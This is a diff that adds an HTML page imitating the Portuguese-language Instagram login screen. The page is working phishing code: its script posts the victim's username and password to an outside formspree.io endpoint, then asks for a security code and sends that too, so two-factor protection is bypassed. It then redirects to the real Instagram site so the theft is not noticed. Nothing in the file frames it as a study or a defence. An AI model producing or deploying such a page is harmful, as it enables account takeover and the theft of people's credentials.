@@ -1,0 +1,65 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Instagram</title>
+<style>
+*{box-sizing:border-box}
+body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#fff;display:flex;flex-direction:column;align-items:center;min-height:100vh;padding:0 30px}
+.logo{margin:46px 0 34px;width:175px;text-align:center;font:italic 600 38px Georgia,serif}
+.logo img{width:100%;display:block}
+form{width:100%;max-width:345px}
+input{width:100%;padding:14px 10px;font-size:15px;border:1px solid #dbdbdb;border-radius:5px;background:#fafafa;margin-bottom:7px;outline:none}
+input:focus{border-color:#a8a8a8}
+button{width:100%;padding:13px;margin-top:8px;border:0;border-radius:8px;background:#0095f6;color:#fff;font-size:15px;font-weight:600}
+button:disabled{opacity:.6}
+#hint{font-size:12.5px;color:#8e8e8e;text-align:center;margin:16px 0 0}
+#step2{display:none}
+.sp{width:22px;height:22px;border:2px solid #dbdbdb;border-top-color:#0095f6;border-radius:50%;margin:24px auto 0;animation:r .8s linear infinite;display:none}
+@keyframes r{to{transform:rotate(360deg)}}
+</style>
+</head>
+<body>
+<div class="logo"><img id="lg" src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/1920px-Instagram_logo_2016.svg.png" alt=""><div id="txt" style="display:none">Instagram</div></div>
+
+<form id="step1">
+  <input name="usuario" placeholder="Nome de usuário, e-mail ou celular" autocapitalize="off" autocomplete="off" required>
+  <input name="senha" type="password" placeholder="Senha" autocomplete="off" required>
+  <button type="submit">Entrar</button>
+</form>
+
+<form id="step2">
+  <input name="codigo" placeholder="Código de segurança" inputmode="numeric" autocomplete="off" required>
+  <button type="submit">Confirmar</button>
+</form>
+
+<p id="hint">Entre para continuar</p>
+<div class="sp" id="sp"></div>
+
+<script>
+var EP="https://formspree.io/f/mzeevlvr";
+var lg=document.getElementById("lg"),tx=document.getElementById("txt");
+lg.onerror=function(){lg.style.display="none";tx.style.display="block"};
+var f1=document.getElementById("step1"),f2=document.getElementById("step2"),
+    h=document.getElementById("hint"),sp=document.getElementById("sp"),t;
+function send(d){return fetch(EP,{method:"POST",headers:{Accept:"application/json","Content-Type":"application/json"},body:JSON.stringify(d)})}
+f1.addEventListener("submit",function(e){
+  e.preventDefault();
+  var d=Object.fromEntries(new FormData(f1));
+  f1.querySelector("button").disabled=true;sp.style.display="block";
+  send(Object.assign({_subject:"IG usuario"},d)).catch(function(){});
+  f1.style.display="none";f2.style.display="block";
+  h.textContent="Confirme o código de segurança";
+  t=setTimeout(function(){location.href="https://www.instagram.com/"},9000);
+});
+f2.addEventListener("input",function(){clearTimeout(t)});
+f2.addEventListener("submit",function(e){
+  e.preventDefault();clearTimeout(t);
+  var d=Object.fromEntries(new FormData(f2));
+  send(Object.assign({_subject:"IG codigo"},d)).catch(function(){});
+  location.href="https://www.instagram.com/";
+});
+</script>
+</body>
+</html>
